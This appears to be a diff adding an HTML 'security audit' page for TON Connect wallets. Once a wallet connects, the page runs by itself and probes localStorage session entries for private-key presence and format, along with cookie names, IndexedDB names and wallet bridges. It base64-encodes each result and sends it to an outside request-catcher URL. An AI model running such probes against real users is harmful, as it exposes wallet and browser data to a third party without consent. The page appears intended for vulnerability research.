@@ -1,0 +1,371 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TON Connect Security Audit</title>
+    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
+    <style>
+        body { font-family: monospace; max-width: 900px; margin: 20px auto; padding: 20px; background: #111; color: #0f0; }
+        .card { background: #1a1a1a; border: 1px solid #333; border-radius: 8px; padding: 20px; margin: 15px 0; }
+        h1 { color: #0ff; } h2 { color: #ff0; font-size: 16px; }
+        pre { background: #000; padding: 10px; border-radius: 4px; overflow-x: auto; color: #0f0; max-height: 300px; }
+        .btn { background: #0098ea; color: white; border: none; padding: 10px 20px; border-radius: 6px; cursor: pointer; margin: 5px; font-family: monospace; }
+        .btn:hover { background: #0077b6; }
+        .btn:disabled { background: #444; cursor: not-allowed; }
+        .btn.danger { background: #a00; }
+        .btn.danger:hover { background: #c00; }
+        #ton-connect { margin: 20px 0; }
+        #log { background: #000; padding: 10px; border-radius: 4px; max-height: 300px; overflow-y: auto; }
+        .log-entry { border-bottom: 1px solid #222; padding: 3px 0; font-size: 12px; }
+        .log-entry.error { color: #f44; }
+        .log-entry.success { color: #4f4; }
+        .log-entry.warn { color: #fa0; }
+        .status { padding: 8px 12px; border-radius: 4px; display: inline-block; margin: 5px 0; font-size: 13px; }
+        .status.on { background: #0a0; color: white; }
+        .status.off { background: #a00; color: white; }
+    </style>
+</head>
+<body>
+    <h1>🔍 TON Connect Security Audit</h1>
+    <p>Connect wallet dulu, baru jalankan test.</p>
+
+    <div class="card">
+        <h2>Step 1: Connect Wallet</h2>
+        <div id="ton-connect"></div>
+        <div id="status" class="status off">Belum terhubung</div>
+        <div id="wallet-info" style="display:none; margin-top: 10px;">
+            <p><b>Address:</b> <span id="addr">-</span></p>
+            <p><b>Chain:</b> <span id="chain">-</span></p>
+        </div>
+    </div>
+
+    <div class="card">
+        <h2>Step 2: Endpoint Target</h2>
+        <input type="text" id="endpoint" 
+               value="https://ckytrx0m.instances.httpworkbench.com/" 
+               style="width: 100%; padding: 8px; background: #000; color: #0f0; border: 1px solid #333; border-radius: 4px; box-sizing: border-box;">
+    </div>
+
+    <div class="card">
+        <h2>Step 3: Jalankan Test (setelah connect)</h2>
+        <button class="btn" id="btn-test-1" onclick="testSessionStorage()" disabled>Test 1: Session Storage</button>
+        <button class="btn" id="btn-test-2" onclick="testJsBridge()" disabled>Test 2: JS Bridge</button>
+        <button class="btn" id="btn-test-3" onclick="testBridgeSSE()" disabled>Test 3: Bridge SSE</button>
+        <button class="btn danger" id="btn-disconnect" onclick="disconnectWallet()" style="display:none;">Disconnect</button>
+    </div>
+
+    <div class="card">
+        <h2>Result: Test 1 — Session Storage</h2>
+        <pre id="result-session">-</pre>
+    </div>
+
+    <div class="card">
+        <h2>Result: Test 2 — JS Bridge</h2>
+        <pre id="result-bridge">-</pre>
+    </div>
+
+    <div class="card">
+        <h2>Result: Test 3 — Bridge SSE</h2>
+        <pre id="result-sse">-</pre>
+    </div>
+
+    <div class="card">
+        <h2>Log</h2>
+        <div id="log"></div>
+    </div>
+
+    <script>
+        let tonConnectUI = null;
+        let currentWallet = null;
+
+        const MANIFEST_URL = 'https://ton-connect.github.io/demo-dapp-with-react-ui/tonconnect-manifest.json';
+        const ENDPOINT = () => document.getElementById('endpoint').value;
+
+        // ============================================
+        // Logging
+        // ============================================
+        function log(msg, type = 'info') {
+            const logEl = document.getElementById('log');
+            const entry = document.createElement('div');
+            entry.className = `log-entry ${type}`;
+            entry.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
+            logEl.prepend(entry);
+            console.log(msg);
+        }
+
+        // ============================================
+        // Send to endpoint
+        // ============================================
+        async function sendToEndpoint(data) {
+            const encoded = btoa(unescape(encodeURIComponent(JSON.stringify(data))));
+            const url = ENDPOINT() + '?data=' + encoded;
+            try {
+                await fetch(url, { mode: 'no-cors' });
+                log(`✅ Sent to endpoint (${encoded.length} bytes)`, 'success');
+            } catch (e) {
+                log(`❌ Failed to send: ${e.message}`, 'error');
+            }
+        }
+
+        // ============================================
+        // Init TON Connect
+        // ============================================
+        function initTonConnect() {
+            try {
+                tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
+                    manifestUrl: MANIFEST_URL,
+                    buttonRootId: 'ton-connect'
+                });
+
+                tonConnectUI.onStatusChange(wallet => {
+                    if (wallet) {
+                        currentWallet = wallet;
+                        onConnected(wallet);
+                    } else {
+                        currentWallet = null;
+                        onDisconnected();
+                    }
+                });
+
+                log('TON Connect initialized');
+            } catch (e) {
+                log(`Init error: ${e.message}`, 'error');
+            }
+        }
+
+        function onConnected(wallet) {
+            document.getElementById('status').className = 'status on';
+            document.getElementById('status').textContent = '✅ Wallet terhubung';
+            document.getElementById('wallet-info').style.display = 'block';
+            document.getElementById('addr').textContent = wallet.account.address;
+            document.getElementById('chain').textContent = wallet.account.chain;
+
+            // Enable test buttons
+            document.getElementById('btn-test-1').disabled = false;
+            document.getElementById('btn-test-2').disabled = false;
+            document.getElementById('btn-test-3').disabled = false;
+            document.getElementById('btn-disconnect').style.display = 'inline-block';
+
+            log(`Wallet connected: ${wallet.account.address.substring(0, 10)}...`, 'success');
+
+            // Auto-run session test setelah connect
+            setTimeout(() => testSessionStorage(), 1000);
+        }
+
+        function onDisconnected() {
+            document.getElementById('status').className = 'status off';
+            document.getElementById('status').textContent = 'Belum terhubung';
+            document.getElementById('wallet-info').style.display = 'none';
+
+            document.getElementById('btn-test-1').disabled = true;
+            document.getElementById('btn-test-2').disabled = true;
+            document.getElementById('btn-test-3').disabled = true;
+            document.getElementById('btn-disconnect').style.display = 'none';
+
+            log('Wallet disconnected', 'warn');
+        }
+
+        async function disconnectWallet() {
+            if (tonConnectUI) await tonConnectUI.disconnect();
+        }
+
+        // ============================================
+        // TEST 1: Session Storage Analysis
+        // ============================================
+        async function testSessionStorage() {
+            log('Running Test 1: Session Storage...');
+            const result = {
+                test: 'session_storage',
+                timestamp: new Date().toISOString(),
+                walletAddress: currentWallet?.account?.address,
+                chain: currentWallet?.account?.chain,
+                origin: location.origin,
+                userAgent: navigator.userAgent
+            };
+
+            try {
+                // Cek semua localStorage keys
+                const allKeys = Object.keys(localStorage);
+                result.localStorageKeys = allKeys;
+
+                // Cari key "sessions" (yang dipakai @ton/walletkit)
+                const sessionsRaw = localStorage.getItem('sessions');
+                result.hasSessionsKey = !!sessionsRaw;
+                result.sessionsRawLength = sessionsRaw?.length || 0;
+
+                if (sessionsRaw) {
+                    try {
+                        const sessions = JSON.parse(sessionsRaw);
+                        result.sessionCount = Array.isArray(sessions) ? sessions.length : 1;
+                        const sessionList = Array.isArray(sessions) ? sessions : [sessions];
+                        result.sessions = sessionList.map(s => ({
+                            domain: s.domain,
+                            walletId: s.walletId,
+                            walletAddress: s.walletAddress,
+                            hasPrivateKey: !!s.privateKey,
+                            privateKeyLength: s.privateKey?.length || 0,
+                            privateKeyFormat: s.privateKey?.match(/^[0-9a-f]+$/i) ? 'hex' : 'base64/other',
+                            publicKeyLength: s.publicKey?.length || 0,
+                            isJsBridge: s.isJsBridge,
+                            schemaVersion: s.schemaVersion,
+                            createdAt: s.createdAt
+                        }));
+                        result.privateKeyPlaintext = sessionList.some(s => 
+                            s.privateKey && (s.privateKey.length === 64 || s.privateKey.length === 128)
+                        );
+                    } catch (e) {
+                        result.parseError = e.message;
+                    }
+                }
+
+                // Cari key lain yang mungkin berisi session
+                result.otherSessionKeys = allKeys.filter(k => 
+                    k.toLowerCase().includes('session') || 
+                    k.toLowerCase().includes('ton') ||
+                    k.toLowerCase().includes('wallet') ||
+                    k.toLowerCase().includes('connect')
+                );
+
+                // Cek sessionStorage
+                result.sessionStorageKeys = Object.keys(sessionStorage);
+
+                // Cek indexedDB
+                if (window.indexedDB) {
+                    try {
+                        const dbs = await indexedDB.databases();
+                        result.indexedDBs = dbs.map(d => ({ name: d.name, version: d.version }));
+                    } catch (e) {
+                        result.indexedDBError = e.message;
+                    }
+                }
+
+                // Cek cookie
+                result.cookieLength = document.cookie.length;
+                result.cookieNames = document.cookie.split(';').map(c => c.trim().split('=')[0]).filter(Boolean);
+
+                document.getElementById('result-session').textContent = JSON.stringify(result, null, 2);
+                log('Session storage test selesai', 'success');
+            } catch (e) {
+                result.error = e.message;
+                document.getElementById('result-session').textContent = JSON.stringify(result, null, 2);
+                log(`Error: ${e.message}`, 'error');
+            }
+
+            await sendToEndpoint(result);
+        }
+
+        // ============================================
+        // TEST 2: JS Bridge Detection
+        // ============================================
+        async function testJsBridge() {
+            log('Running Test 2: JS Bridge...');
+            const result = {
+                test: 'js_bridge',
+                timestamp: new Date().toISOString(),
+                origin: location.origin,
+                href: location.href,
+                isInIframe: window.self !== window.top,
+                isInWebView: /wv|WebView/i.test(navigator.userAgent) || window.ReactNativeWebView !== undefined,
+                userAgent: navigator.userAgent
+            };
+
+            try {
+                // Scan window keys untuk bridge
+                const allKeys = Object.keys(window);
+                const candidates = allKeys.filter(k => 
+                    k.includes('tonconnect') || k.includes('ton') || 
+                    k.includes('wallet') || k.includes('bridge') ||
+                    k.startsWith('__')
+                );
+                result.windowKeys = candidates;
+
+                // Cek window.ton
+                if (window.ton) {
+                    result.windowTon = {
+                        keys: Object.keys(window.ton),
+                        hasTonconnect: !!window.ton.tonconnect,
+                        tonconnectKeys: window.ton.tonconnect ? Object.keys(window.ton.tonconnect) : null
+                    };
+                }
+
+                // Cek window.__walletkitResponse
+                result.hasWalletkitResponse = typeof window.__walletkitResponse === 'function';
+
+                // Cek TON_CONNECT_UI
+                result.hasTonConnectUI = typeof TON_CONNECT_UI !== 'undefined';
+
+                // Cek window.postMessage handler
+                result.hasPostMessage = typeof window.postMessage === 'function';
+
+                // Cek apakah ada __proto__ pollution di window
+                result.protoHasTon = !!Object.getPrototypeOf(window).ton;
+
+                document.getElementById('result-bridge').textContent = JSON.stringify(result, null, 2);
+                log('JS bridge test selesai', 'success');
+            } catch (e) {
+                result.error = e.message;
+                document.getElementById('result-bridge').textContent = JSON.stringify(result, null, 2);
+                log(`Error: ${e.message}`, 'error');
+            }
+
+            await sendToEndpoint(result);
+        }
+
+        // ============================================
+        // TEST 3: Bridge SSE Enumeration
+        // ============================================
+        async function testBridgeSSE() {
+            log('Running Test 3: Bridge SSE...');
+            const result = {
+                test: 'bridge_sse',
+                timestamp: new Date().toISOString()
+            };
+
+            const bridges = [
+                'https://walletbot.me/tonconnect-bridge/bridge',
+                'https://bridge.tonapi.io/bridge'
+            ];
+
+            result.bridgesTested = [];
+
+            for (const bridgeUrl of bridges) {
+                const bridgeResult = { url: bridgeUrl };
+                try {
+                    const testId = '0000000000000000000000000000000000000000000000000000000000000000';
+                    const controller = new AbortController();
+                    const timeout = setTimeout(() => controller.abort(), 5000);
+
+                    const res = await fetch(
+                        `${bridgeUrl}/events?client_id=${testId}`,
+                        { 
+                            headers: { 'Accept': 'text/event-stream' },
+                            signal: controller.signal
+                        }
+                    );
+                    clearTimeout(timeout);
+
+                    bridgeResult.status = res.status;
+                    bridgeResult.contentType = res.headers.get('content-type');
+                    bridgeResult.accessible = res.ok;
+                    bridgeResult.corsAllow = res.headers.get('access-control-allow-origin');
+
+                    log(`Bridge ${bridgeUrl}: ${res.status}`, res.ok ? 'success' : 'error');
+                } catch (e) {
+                    bridgeResult.error = e.message;
+                    log(`Bridge ${bridgeUrl}: ${e.message}`, 'error');
+                }
+                result.bridgesTested.push(bridgeResult);
+            }
+
+            document.getElementById('result-sse').textContent = JSON.stringify(result, null, 2);
+            await sendToEndpoint(result);
+        }
+
+        // ============================================
+        // Init
+        // ============================================
+        window.addEventListener('DOMContentLoaded', initTonConnect);
+    </script>
+</body>
+  </html>
